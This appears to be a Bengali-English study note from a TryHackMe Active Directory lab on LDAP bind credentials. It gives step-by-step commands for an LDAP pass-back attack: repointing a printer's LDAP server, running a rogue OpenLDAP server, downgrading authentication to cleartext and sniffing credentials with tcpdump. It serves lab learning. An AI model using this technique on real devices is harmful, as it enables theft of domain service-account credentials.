# **LDAP Bind Credentials**

### **1. LDAP Authentication**

**LDAP (Lightweight Directory Access Protocol):** Applications LDAP ব্যবহার করে Active Directory থেকে User-এর credentials verify করে।

**NetNTLM vs LDAP:**

| NetNTLM                              | LDAP                                             |
| ------------------------------------ | ------------------------------------------------ |
| Challenge-Response                   | Application সরাসরি LDAP-এ credentials verify করে |
| DC authentication verify করে         | Application AD credentials দিয়ে LDAP query করে   |
| Application credentials store করে না | Application-এর নিজস্ব AD credentials থাকে        |

**LDAP ব্যবহার করে:**

- GitLab
- Jenkins
- Custom Web Applications
- Printers
- VPNs

### **2. LDAP Credentials কোথায় পাওয়া যায়?**

- LDAP ব্যবহারকারী application-এর configuration files-এ AD credentials থাকতে পারে।
- GitLab বা Jenkins server compromise করতে পারলে configuration files থেকে credentials পাওয়া সম্ভব।
- অনেক সময় credentials plain text-এ store করা থাকে।

### **3. LDAP Pass-back Attack**

**LDAP Pass-back:** কোনো device-এর LDAP configuration পরিবর্তন করে নিজের rogue LDAP server-এ authentication পাঠিয়ে credentials capture করা।


[slideshare.net](https://www.slideshare.net/slideshow/offensive-operations-the-anatomy-of-a-network-takeover-def3/284253312?utm_source=chatgpt.com)

**Attack Process:**

1. Printer বা network device-এর admin panel access করো।
2. LDAP settings খুঁজে বের করো।
3. LDAP Server IP নিজের IP দিয়ে replace করো।
4. নিজের machine-এ LDAP listener চালাও।
5. Device থেকে `Test Settings` চাপো।
6. Device তোমার server-এ authentication request পাঠাবে।
7. Credentials capture করো।

### **4. Netcat দিয়ে Connection Test**

LDAP default port: `389`

```
nc -lvp 389
```

AttackBox ব্যবহার করলে আগে:

```
sudo service slapd stop
```

নিজের VPN IP বের করতে:

```
ip a
```

VPN IP সাধারণত `10.50.x.x` অথবা `10.51.x.x`।

**Problem:** Netcat connection পেলেও credentials পাওয়া যাবে না। কারণ LDAP প্রথমে authentication mechanism negotiate করে।

### **5. Rogue LDAP Server Setup**

Tool: **OpenLDAP**

Install:

```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

Configuration:

```
sudo dpkg-reconfigure -p low slapd
```

Settings:

- Skip configuration? → `No`
- DNS Domain → `za.tryhackme.com`
- Organisation → `za.tryhackme.com`
- Administrator password → নিজের দেওয়া password
- Database → `MDB`
- Database removal → No
- Move old database files → Yes

### **6. LDAP Authentication Downgrade**

LDAP server-কে শুধু `PLAIN` ও `LOGIN` authentication support করাতে হবে, যাতে credentials cleartext-এ পাঠানো হয়।

File: `olcSaslSecProps.ldif`

```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

**Important Values:**

| Setting           | কাজ                                                 |
| ----------------- | --------------------------------------------------- |
| `olcSaslSecProps` | SASL security properties                            |
| `noanonymous`     | Anonymous login বন্ধ                                |
| `minssf=0`        | Minimum security strength 0; protection required নয় |

Apply configuration:

```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

Verify:

```
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

Expected output:

```
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

### **7. Capture LDAP Credentials**

Printer-এর LDAP Server IP নিজের IP দিয়ে replace করে `Test Settings` চাপো।

তারপর:

```
sudo tcpdump -SX -i breachad tcp port 389
```

- `tcpdump` = Network traffic capture।
- `-S` = Absolute TCP sequence numbers।
- `-X` = Hex ও ASCII output।
- `-i breachad` = নির্দিষ্ট network interface।
- `tcp port 389` = LDAP traffic filter।

Captured traffic-এ এমন information পাওয়া যেতে পারে:

```
za.tryhackme.com\svcLDAP
password11
```

`password11` শুধু example, আসল password আলাদা হবে।

**Note:** VPN-এর কারণে একাধিকবার `Test Settings` চাপতে হতে পারে।
